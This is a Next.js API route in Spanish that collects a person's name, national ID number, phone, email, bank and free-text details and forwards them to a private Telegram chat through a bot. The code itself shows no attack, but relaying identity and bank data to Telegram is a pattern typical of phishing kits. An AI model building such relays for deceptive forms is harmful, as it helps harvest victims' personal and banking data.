import { NextResponse } from "next/server";

export async function POST(request: Request) {
  try {
    const data = await request.json();

    const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TOKEN || !CHAT_ID) {
      console.error("Faltan TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID");
      return NextResponse.json(
        { success: false, error: "Variables de entorno ausentes" },
        { status: 500 }
      );
    }

    const {
      pagina,
      nombre,
      cedula,
      telefono,
      correo,
      banco,
      detalles,
    } = data;

    const mensajeTelegram = `
${pagina || "📝 NUEVA SOLICITUD"}
━━━━━━━━━━━━━━━━━━

👤 DATOS DEL CLIENTE
• Nombre: ${nombre || "No indicado"}
• Cédula: ${cedula || "No indicada"}
• Teléfono: ${telefono || "No indicado"}
• Correo: ${correo || "No indicado"}

🏦 BANCO / ESTADO
${banco || "Pendiente de selección"}

📝 DETALLES
${detalles || "Sin detalles adicionales"}

━━━━━━━━━━━━━━━━━━
`.trim();

    const response = await fetch(
      `https://api.telegram.org/bot${TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: mensajeTelegram,
        }),
      }
    );

    const result = await response.json();

    if (!result.ok) {
      console.error("Error de Telegram:", result);
      return NextResponse.json(
        { success: false, error: result.description || "Error de Telegram" },
        { status: 500 }
      );
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Error interno:", error);

    return NextResponse.json(
      { success: false, error: "Error interno del servidor" },
      { status: 500 }
    );
  }
}